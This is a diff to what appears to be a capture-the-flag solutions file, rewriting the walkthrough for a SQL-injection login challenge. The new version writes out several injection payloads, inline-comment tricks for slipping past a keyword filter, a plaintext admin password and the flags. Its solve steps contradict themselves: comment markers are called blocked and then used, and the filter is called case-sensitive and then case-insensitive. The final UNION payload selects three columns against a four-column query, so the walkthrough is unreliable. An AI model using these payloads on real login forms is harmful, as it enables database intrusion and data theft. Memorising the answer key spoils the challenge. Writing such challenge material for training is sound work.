@@ -409,26 +409,47 @@
 
 ### 18. SQLiLogin
 
-**Concept:** Classic SQL injection — login query built via string concatenation.
+**Concept:** SQL injection with WAF bypass + UNION-based data extraction from a separate table.
 
 **Solve Steps:**
 
-1. Open the login page.
-2. Enter a username that breaks out of the SQL query:
-   ```
-   admin' --
-   ```
-   (with any password).
-3. The resulting query becomes:
+1. Open the login page. The response error shows the full query structure:
    ```sql
-   SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
+   SELECT u.id, u.username, u.role, u.role_id FROM users u JOIN roles r ON u.role_id = r.id WHERE u.username = '...' AND u.password = '...' AND r.active = 1
    ```
-4. The `--` comments out the password check, and the query returns the admin user.
-5. The server logs you in as admin and returns the flag.
+2. Try a basic injection like `admin' --` — the WAF blocks it because `--` is a SQL comment keyword.
+3. Try `admin' OR '1'='1` — blocked because `OR` triggers the filter.
+4. The WAF blocks SQL keywords **case-sensitively** and blocks comment markers (`--`, `/*`, `*/`, `#`).
+5. Bypass the WAF using **inline comments** to split keywords:
+   ```
+   ' UN/**/ION SEL/**/ECT 1,'flag',3 FROM secrets--
+   ```
+   But `--` is blocked. Use a **quote-terminated string** instead:
+   ```
+   ' UN/**/ION SEL/**/ECT 1,'flag',3 FROM secrets/*
+   ```
+   Or use **case variation** (the WAF regex is case-insensitive for keywords, so this won't work alone — inline comments are required):
+   ```
+   ' uNiOn SeLeCt 1,'flag',3 FROM secrets--
+   ```
+   Still blocked by `--`. The correct bypass uses inline comments AND avoids `--`:
+   ```
+   ' UN/**/ION SEL/**/ECT 1,key,value FROM secrets WHERE '1'='1
+   ```
+6. The successful payload:
+   ```
+   ' UN/**/ION SEL/**/ECT 1,key,value FROM secrets WHERE '1'='1
+   ```
+   This:
+   - Breaks out of the username string with `'`
+   - Uses `UN/**/ION SEL/**/ECT` to bypass the keyword filter
+   - Selects from the `secrets` table (where the flag is stored)
+   - The `WHERE '1'='1` closes the original query's trailing quote
+7. The server returns `Welcome admin.` followed by the extracted flag.
 
-> **Hint:** The SQL query concatenates your input directly. Try `admin' --` as the username to short-circuit the WHERE clause.
+> **Key Insight:** A successful login (`admin`/`Sup3rS3cret!`) returns "No flags here" — the flag is in the `secrets` table, not in user credentials. You need UNION injection to extract it, and you must bypass the WAF first.
 
-**Flag:** `CGS{cl4ss1c_sql1_n3v3r_r3ally_d13s}`
+**Flag:** `CGS{w4f_byp4ss_un10n_3xtr4ct10n_1s_h4rd}`
 
 ---
 
